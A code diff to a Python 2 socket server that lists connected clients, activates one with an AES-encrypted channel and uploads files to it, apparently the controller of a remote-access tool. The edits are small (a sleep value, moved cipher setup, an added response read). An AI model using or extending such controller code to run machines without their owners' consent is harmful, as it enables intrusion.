@@ -93,7 +93,7 @@ def upload(sock, local_filename, remote_filename=None):
 		if not fileData: break
 		Send(sock, fileData, "")
 	g.close()
-	time.sleep(interval)
+	time.sleep(10)
 	Send(sock, "")
 	time.sleep(interval)
 	
@@ -131,7 +131,7 @@ while True:
 			s.settimeout(None)
 			socks += [s]
 			clients += [str(a)]
-		
+
 		# display clients
 		refresh()
 		
@@ -159,12 +159,15 @@ while True:
 		# clear screen
 		clear()
 		
+		
+		# create a cipher object using the random secret
+		cipher = AES.new(secret,AES.MODE_CFB)
+		print '\nActivating client: ' + clients[activate] + '\n'
+		active = True
 		try:
-			# create a cipher object using the random secret
-			cipher = AES.new(secret,AES.MODE_CFB)
-			print '\nActivating client: ' + clients[activate] + '\n'
-			active = True
 			Send(socks[activate], 'Activate')
+			resp = socks[activate].recv(1024)
+			print resp
 		except socket.error:
 			print '\nPreviously disconnected by client.\n'
 			time.sleep(0.8)
